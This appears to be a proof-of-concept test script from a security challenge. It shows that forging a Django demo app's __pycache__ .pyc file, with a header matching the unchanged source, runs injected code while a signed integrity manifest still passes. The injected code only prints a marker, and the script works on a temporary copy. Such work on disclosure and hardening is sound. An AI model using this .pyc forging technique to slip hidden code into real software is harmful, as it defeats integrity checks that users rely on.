"""Show that a tampered demo/__pycache__ pyc bypasses the manifest.

Usage: python pycache_tamper.py <extracted round3-django-shielded>

Copies the tree to a temporary directory, rewrites one __pycache__ entry with
benign marker code whose pyc header matches the unchanged .py stub, then runs
manage.py check. The marker executes while the signed manifest still passes.
No source file is modified.
"""
import importlib.util
import marshal
import os
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

sys.dont_write_bytecode = True
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TREE = Path(sys.argv[1]).resolve()
MARKER = "PYSHELD_PYC_BYPASS"


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="pyshield-pyc-tamper-") as temp:
        copy = Path(temp) / "app"
        shutil.copytree(TREE, copy)
        source = copy / "demo" / "__init__.py"
        pycache = copy / "demo" / "__pycache__" / "__init__.cpython-312.pyc"
        if not pycache.is_file():
            print("FAIL: challenge tree has no demo/__pycache__ entry")
            return 1
        stat = source.stat()
        header = (
            importlib.util.MAGIC_NUMBER
            + struct.pack("<I", 0)  # timestamp-based pyc
            + struct.pack("<I", int(stat.st_mtime))
            + struct.pack("<I", stat.st_size)
        )
        code = compile(f"print({MARKER!r})\n", str(source), "exec")
        pycache.write_bytes(header + marshal.dumps(code))
        env = os.environ.copy()
        env["PYTHONDONTWRITEBYTECODE"] = "1"
        env["PYSHELD_STATE_DIR"] = str(Path(temp) / "state")
        env.pop("PYSHELD_ALLOW_LEGACY_STATE", None)
        env.pop("PYSHELD_ALLOW_VOLATILE_STATE", None)
        completed = subprocess.run(
            [sys.executable, "manage.py", "check"],
            cwd=copy, env=env, capture_output=True, text=True,
            encoding="utf-8", errors="replace", timeout=60,
        )
        output = (completed.stdout or "") + (completed.stderr or "")
        print(output.strip())
        print("returncode:", completed.returncode)
        if MARKER not in output:
            print("FAIL: tampered pyc did not execute")
            return 1
        if completed.returncode != 0:
            print("FAIL: manage.py check failed")
            return 1
        if "System check identified no issues" not in output:
            print("FAIL: Django check did not pass")
            return 1
        print("OK: tampered __pycache__ executed while the signed manifest passed")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
